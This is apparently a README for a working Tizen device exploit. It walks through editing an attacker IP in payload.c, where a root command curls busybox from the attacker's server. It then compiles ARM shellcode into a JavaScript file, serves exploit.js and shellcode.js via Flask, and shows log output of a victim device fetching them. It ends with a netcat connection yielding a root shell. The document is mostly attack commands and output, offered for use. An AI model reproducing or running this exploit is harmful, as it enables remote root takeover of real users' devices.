
*************
Tizen exploit
*************

Change attacker's IP
====================

Please update attacker IP inside payload.c :

.. code-block:: c

    char cmd_busybox[] = "/usr/bin/curl http://192.168.1.37:5000/static/busybox -o /tmp/busybox\x00";
    exec_as_root(cmd_busybox, sizeof(cmd_busybox));
    nanosleep(&time_1s, 0);

Compile payload && run webserver
================================

.. code-block:: console

    $ make -C payload/
	arm-linux-gnueabi-gcc -fPIC -fPIE -nostdlib -fno-builtin -Os -Wall -c -o entry.o entry.S
	arm-linux-gnueabi-gcc -fPIC -fPIE -nostdlib -fno-builtin -Os -Wall -c -o payload.o payload.c
	arm-linux-gnueabi-ld -T function_order.ld -o payload.elf entry.o payload.o function_order.ld
	objcopy -O binary payload.elf payload.bin
	echo "let shellcode = [" > payload.js
	xxd -i payload.bin | tail -n +2 | head -n -2 >> payload.js
	echo "];" >> payload.js
	$ cp payload/payload.js static/shellcode.js
	$ ./run.sh
	* Serving Flask app "app.py" (lazy loading)
	* Environment: production
	WARNING: This is a development server. Do not use it in a production deployment.
	Use a production WSGI server instead.
	* Debug mode: on
	* Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
	* Restarting with stat
	* Debugger is active!
	192.168.1.36 - - [12/Apr/2021 17:27:38] "GET / HTTP/1.1" 200 -
	192.168.1.36 - - [12/Apr/2021 17:27:38] "GET /static/exploit.js HTTP/1.1" 200 -
	192.168.1.36 - - [12/Apr/2021 17:27:38] "GET /static/shellcode.js HTTP/1.1" 200 -
	[2021-04-12 17:27:38,483] INFO in app: 2021-04-12T15:27:17.467Z: Let's go !
	192.168.1.36 - - [12/Apr/2021 17:27:38] "GET /log?str=2021-04-12T15:27:17.467Z:%20Let%27s%20go%20! HTTP/1.1" 200 -
	...
	[2021-04-12 17:27:38,984] INFO in app: 2021-04-12T15:27:17.979Z: ok !
	192.168.1.36 - - [12/Apr/2021 17:27:38] "GET /log?str=2021-04-12T15:27:17.979Z:%20ok%20! HTTP/1.1" 200 -
	192.168.1.36 - - [12/Apr/2021 17:27:39] "GET /static/busybox HTTP/1.1" 200 -

Root shell !
============

Connect on port 4343.

	$ nc 192.168.1.36 4343 -vvv
	(UNKNOWN) [192.168.1.36] 4343 (?) open
	id
	uid=0(root) gid=0(root) context="_"
